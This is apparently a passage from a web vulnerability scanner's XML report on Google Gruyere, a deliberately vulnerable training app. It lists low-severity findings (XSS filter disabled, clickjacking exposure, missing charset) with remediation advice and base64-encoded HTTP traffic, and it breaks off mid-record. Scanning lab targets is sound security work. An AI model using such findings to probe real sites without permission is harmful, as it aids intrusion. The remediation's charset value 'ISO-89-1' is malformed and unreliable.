Y4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9zbmlwcGV0cy5ndGwnPk15Jm5ic3A7U25pcHBldHM8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdzbmlwcGV0Lmd0bCc+TmV3Jm5ic3A7U25pcHBldDwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3VwbG9hZC5ndGwnPlVwbG9hZDwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIDxzcGFuIGNsYXNzPSdtZW51LXVzZXInPgogICAgICAgIDU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSAmbHQ7NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tJmd0OwogICAgICA8L3NwYW4+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsJz5Qcm9maWxlPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0Jz5TaWduIG91dDwvYT4KICAgICAgCiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+CgoKCjxkaXYgY2xhc3M9J21lc3NhZ2UnPkludmFsaWQgcmVxdWVzdDogL3NhdmVwcm9maWxlZ2I1a3VpaWcyZzwvZGl2PgoKCjwvYm9keT4KCjwvaHRtbD4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2467304167467547648</serialNumber>
    <type>5245360</type>
    <name><![CDATA[Browser cross-site scripting filter disabled]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/snippets.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/snippets.gtl]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Some browsers, including Internet Explorer, contain built-in filters designed to protect against cross-site scripting (XSS) attacks. Applications can instruct browsers to disable this filter by setting the following response header:</p>
<p><b>X-XSS-Protection: 0</b></p>
<p>This behavior does not in itself constitute a vulnerability; in some cases XSS filters may themselves be leveraged to perform attacks against application users. However, in typical situations XSS filters do provide basic protection for application users against some XSS vulnerabilities in applications. The presence of this header should be reviewed to establish whether it affects the application's security posture. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Review whether the application needs to disable XSS filters. In most cases you can gain the protection provided by XSS filters without the associated risks by using the following response header:</p>
<p><b>X-XSS-Protection: 1; mode=block</b></p>
<p>When this header is set, browsers that detect an XSS attack will simply render a blank page instead of attempting to sanitize the injected script. This behavior is considerably less likely to introduce new security issues. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="http://blogs.msdn.com/b/ieinternals/archive/2011/01/31/controlling-the-internet-explorer-xss-filter-with-the-x-xss-protection-http-header.aspx">Controlling the XSS Filter</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc25pcHBldHMuZ3RsIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KQ29va2llOiBHUlVZRVJFX0lEPTQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogNGE5MDkxNWQyZDNkMDQ1NjlhZTgwNGNiODRmOWM0ZDINClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MDoyNSBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzAyMw0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IFNuaXBwZXRzPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjxzY3JpcHQgc3JjPSIvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2xpYi5qcyIgdGV4dD0idGV4dC9qYXZhc2NyaXB0Ij4KPC9zY3JpcHQ+CjwvaGVhZD4KCjxib2R5PgoKCjxkaXYgY2xhc3M9J21lbnUnPgogIDxzcGFuIGlkPSdtZW51LWxlZnQnPgogICAgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi8nPkhvbWU8L2E+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc25pcHBldHMuZ3RsJz5NeSZuYnNwO1NuaXBwZXRzPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbmV3c25pcHBldC5ndGwnPk5ldyZuYnNwO1NuaXBwZXQ8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi91cGxvYWQuZ3RsJz5VcGxvYWQ8L2E+CiAgICAgIAogIDwvc3Bhbj4KICA8c3BhbiBpZD0nbWVudS1yaWdodCc+CiAgICAgIAogICAgICA8c3BhbiBjbGFzcz0nbWVudS11c2VyJz4KICAgICAgICA1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20gJmx0OzU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSZndDsKICAgICAgPC9zcGFuPgogICAgICAKICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2VkaXRwcm9maWxlLmd0bCc+UHJvZmlsZTwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2xvZ291dCc+U2lnbiBvdXQ8L2E+CiAgICAgIAogICAgICAKICA8L3NwYW4+CjwvZGl2PgoKPGRpdj4KPGgyIGNsYXNzPSdoYXMtcmVmcmVzaCcgaWQ9InVzZXJfbmFtZSI+CgoKICBNeSBTbmlwcGV0cwogIAoKPC9oMj4KPGRpdiBjbGFzcz0ncmVmcmVzaCc+PGEgY2xhc3M9J2J1dHRvbicKICBvbmNsaWNrPSdfcmVmcmVzaFNuaXBwZXRzKCI0MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYiLCAiNTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tIiknCiAgaHJlZj0nIyc+UmVmcmVzaDwvYT48L2Rpdj4KPGRpdiBjbGFzcz0nY29udGVudCc+CgoKCgogIAogIAogICAgCiAgICAgIE5vIHNuaXBwZXRzLgogICAgCiAgICAKICAKICA8YnI+CiAgPGEgaHJlZj0nJz5NeSBzaXRlPC9hPgoKPC9kaXY+CjwvYm9keT4KPC9odG1sPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4806230028422451200</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/snippets.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/snippets.gtl]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc25pcHBldHMuZ3RsIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KQ29va2llOiBHUlVZRVJFX0lEPTQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogNGE5MDkxNWQyZDNkMDQ1NjlhZTgwNGNiODRmOWM0ZDINClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MDoyNSBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzAyMw0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IFNuaXBwZXRzPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjxzY3JpcHQgc3JjPSIvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2xpYi5qcyIgdGV4dD0idGV4dC9qYXZhc2NyaXB0Ij4KPC9zY3JpcHQ+CjwvaGVhZD4KCjxib2R5PgoKCjxkaXYgY2xhc3M9J21lbnUnPgogIDxzcGFuIGlkPSdtZW51LWxlZnQnPgogICAgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi8nPkhvbWU8L2E+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc25pcHBldHMuZ3RsJz5NeSZuYnNwO1NuaXBwZXRzPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbmV3c25pcHBldC5ndGwnPk5ldyZuYnNwO1NuaXBwZXQ8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi91cGxvYWQuZ3RsJz5VcGxvYWQ8L2E+CiAgICAgIAogIDwvc3Bhbj4KICA8c3BhbiBpZD0nbWVudS1yaWdodCc+CiAgICAgIAogICAgICA8c3BhbiBjbGFzcz0nbWVudS11c2VyJz4KICAgICAgICA1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20gJmx0OzU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSZndDsKICAgICAgPC9zcGFuPgogICAgICAKICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2VkaXRwcm9maWxlLmd0bCc+UHJvZmlsZTwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2xvZ291dCc+U2lnbiBvdXQ8L2E+CiAgICAgIAogICAgICAKICA8L3NwYW4+CjwvZGl2PgoKPGRpdj4KPGgyIGNsYXNzPSdoYXMtcmVmcmVzaCcgaWQ9InVzZXJfbmFtZSI+CgoKICBNeSBTbmlwcGV0cwogIAoKPC9oMj4KPGRpdiBjbGFzcz0ncmVmcmVzaCc+PGEgY2xhc3M9J2J1dHRvbicKICBvbmNsaWNrPSdfcmVmcmVzaFNuaXBwZXRzKCI0MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYiLCAiNTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tIiknCiAgaHJlZj0nIyc+UmVmcmVzaDwvYT48L2Rpdj4KPGRpdiBjbGFzcz0nY29udGVudCc+CgoKCgogIAogIAogICAgCiAgICAgIE5vIHNuaXBwZXRzLgogICAgCiAgICAKICAKICA8YnI+CiAgPGEgaHJlZj0nJz5NeSBzaXRlPC9hPgoKPC9kaXY+CjwvYm9keT4KPC9odG1sPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2877350339255963648</serialNumber>
    <type>8389120</type>
    <name><![CDATA[HTML does not specify charset]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/snippets.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/snippets.gtl]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>If a  response states that it contains HTML content but does not specify a character set, then the browser may analyze the HTML and attempt to determine which character set it appears to be using. Even if the majority of the HTML actually employs a standard character set such as UTF-8, the presence of non-standard characters anywhere in the response may cause the browser to interpret the content using a different character set. This can have unexpected results, and can lead to cross-site scripting vulnerabilities in which non-standard encodings like UTF-7 can be used to bypass the application's defensive filters.</p>
<p>In most cases, the absence of a charset directive does not constitute a security flaw, particularly if the response contains static content. You should review the contents of affected responses, and the context in which they appear, to determine whether any vulnerability exists. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>For every response containing HTML content, the application should include within the Content-type header a directive specifying a standard recognized character set, for example <b>charset=ISO-89-1</b>.
</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/436.html">CWE-436: Interpretation Conflict</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc25pcHBldHMuZ3RsIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KQ29va2llOiBHUlVZRVJFX0lEPTQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogNGE5MDkxNWQyZDNkMDQ1NjlhZTgwNGNiODRmOWM0ZDINClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MDoyNSBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzAyMw0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IFNuaXBwZXRzPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCA